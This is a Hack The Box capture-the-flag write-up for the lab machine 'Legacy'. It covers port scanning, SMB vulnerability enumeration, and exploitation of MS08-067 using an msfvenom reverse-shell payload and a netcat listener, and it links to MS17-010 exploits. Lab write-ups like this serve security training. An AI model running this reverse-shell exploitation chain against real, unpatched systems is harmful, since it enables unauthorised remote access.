# Legacy 

**Links:** [1](https://www.hackthebox.com/machines/Legacy)  [2](https://app.hackthebox.com/machines/Legacy)

**Machine ip:** 10.10.10.4

## Reconnaissance
```
sudo masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.4 -e tun0 > ports

ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')

sudo nmap -Pn -n -sV -sC -O -p$ports 10.10.10.4 --open

sudo nmap -Pn -n -sV -sC -sU -O -p$ports 10.10.10.4 --open
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/f9fb11ab-3893-4b05-9445-a3025431d537)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/56aa3613-f795-4f39-ae91-c937740f5ff4)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/3b75c385-baa0-4aae-b31d-fae7e20d48c1)


## Enumeration
```
ls -l /usr/share/nmap/scripts/smb* | grep vuln

nmap --script smb-vuln* -p 139,445 10.10.10.4
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a4ec1a7b-5542-4821-88b7-9220180785e1)


## Exploitation & Gaining Access & Privilege Escalation

### Method 1: [CVE-2008-4250 (ms08-067) / Conficker](https://0xdf.gitlab.io/2019/02/21/htb-legacy.html#ms-08-067)
+ Download python exploit from **ms08-067: CVE-2008-4250** [1](https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py) [2](https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py)
+ Take this shellcode into the script, and replace it with the default.

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.24 LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python -v shellcode -a x86 --platform windows -o shellcode.txt

python ms08-067.py 10.10.10.4 6 445

nc -lnvp 4444

cd Documents and Settings\john\Desktop

type user.txt

cd C:\Documents and Settings\Administrator\Desktop

type root.txt

```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/78dea999-1856-426b-afe3-69aad9bab9de)

+ Transfer **whoami.exe** from **/usr/share/windows-binaries/** using **smbserver.py** since XP doesn't have a whoami binary or command.
+ Check if get the NT AUTHORITY\SYSTEM level access.

```
smbserver.py win /usr/share/windows-binaries/

\\10.10.14.24\win\whoami.exe
```

+ Get both user and root flags.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/168b61ac-c71d-4f60-8568-a9e1223f669a)


### Method 2: CVE-2017-0143 (ms17-010) / Eternal Blue / Shadow Brokers [1](https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/legacy-writeup-w-o-metasploit#d6e0) [2](https://0xdf.gitlab.io/2019/02/21/htb-legacy.html#ms-17-010)
+ Try [1](https://github.com/helviojunior/MS17-010) [2](https://github.com/helviojunior/MS17-010/blob/master/send_and_execute.py)
+ The exploit didn't work on me due to the below impacket errors:
  + [no module named impacket](https://forum.hackthebox.com/t/impacket-module-not-found-but-installed/3561)
  + [package 'dsinternals' requires a different python 2.7.18 not in ' =3.4'](https://medium.com/@CustosClarus/thank-you-i-have-been-able-to-open-the-virtual-env-with-source-impacket-venv-bin-activate-d5945901ce0c)
+ Others [3](https://github.com/worawit/MS17-010)



# References & Alternatives
+ https://vvmlist.github.io/#legacy
+ https://0xdf.gitlab.io/2019/02/21/htb-legacy.html
+ https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/legacy-writeup-w-o-metasploit
+ 


## CVE Scripting
+ **CVE-2008-4250 (ms08-067) / Conficker:**
  + https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py
  + https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py
+ **CVE-2017-0143 (ms17-010) / Eternal Blue / Shadow Brokers:**
  + https://github.com/helviojunior/MS17-010
    + https://github.com/helviojunior/MS17-010/blob/master/send_and_execute.py
  + https://github.com/worawit/MS17-010


## Tools
+ **windows-binaries / whoami.exe:** /usr/share/windows-binaries
  + https://0xdf.gitlab.io/2019/02/21/htb-legacy.html#beyond-root---whoami
+ **smbserver.py:** /usr/share/doc/python3-impacket/examples/smbserver.py
  + https://0xdf.gitlab.io/2019/02/21/htb-legacy.html#beyond-root---whoami


## Technical Knowledge
+ **how to exploit the Eternal Blue vulnerability without using Metasploit:** https://ethicalhackingguru.com/how-to-exploit-ms17-010-eternal-blue-without-metasploit/


## Problems Solution
+ [no module named impacket](https://forum.hackthebox.com/t/impacket-module-not-found-but-installed/3561)
+ [package 'dsinternals' requires a different python 2.7.18 not in ' =3.4'](https://medium.com/@CustosClarus/thank-you-i-have-been-able-to-open-the-virtual-env-with-source-impacket-venv-bin-activate-d5945901ce0c)


## For More
+ x
